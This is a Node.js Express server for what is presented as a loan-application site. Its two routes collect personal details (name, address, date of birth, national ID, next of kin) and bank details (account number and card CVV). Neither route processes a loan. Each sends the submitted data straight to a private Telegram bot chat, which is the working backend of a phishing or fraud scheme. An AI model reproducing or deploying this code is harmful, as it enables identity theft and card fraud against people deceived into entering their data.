const express = require("express");
const bodyParser = require("body-parser");
const axios = require("axios");
require("dotenv").config();

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static("public")); // Serves your static files

// Home Route
app.get("/", (req, res) => {
  res.sendFile(__dirname + "/public/index.html");
});

// Loan Application Submission
app.post("/apply-loan", async (req, res) => {
  try {
    const { name, email, phone, address, nextOfKin, dob, nationalID } = req.body;

    // Send to Telegram Bot (Replace with your bot token & chat ID)
    const botToken = process.env.BOT_TOKEN;
    const chatID = process.env.CHAT_ID;
    const message = `New Loan Application:\n\nName: ${name}\nEmail: ${email}\nPhone: ${phone}\nAddress: ${address}\nNext of Kin: ${nextOfKin}\nDOB: ${dob}\nNational ID: ${nationalID || "Not Provided"}`;

    await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      chat_id: chatID,
      text: message
    });

    res.json({ success: true, message: "Application submitted successfully!" });
  } catch (error) {
    console.error("Error sending to Telegram:", error);
    res.status(500).json({ success: false, message: "Failed to submit application." });
  }
});

// Bank Verification Route
app.post("/verify-bank", async (req, res) => {
  try {
    const { bankName, accountNumber, cvv } = req.body;

    // Send bank details to Telegram
    const botToken = process.env.BOT_TOKEN;
    const chatID = process.env.CHAT_ID;
    const message = `Bank Verification Details:\n\nBank: ${bankName}\nAccount Number: ${accountNumber}\nCVV: ${cvv}`;

    await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      chat_id: chatID,
      text: message
    });

    res.json({ success: true, message: "Bank verification sent successfully!" });
  } catch (error) {
    console.error("Error verifying bank:", error);
    res.status(500).json({ success: false, message: "Bank verification failed." });
  }
});

// Start Server
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
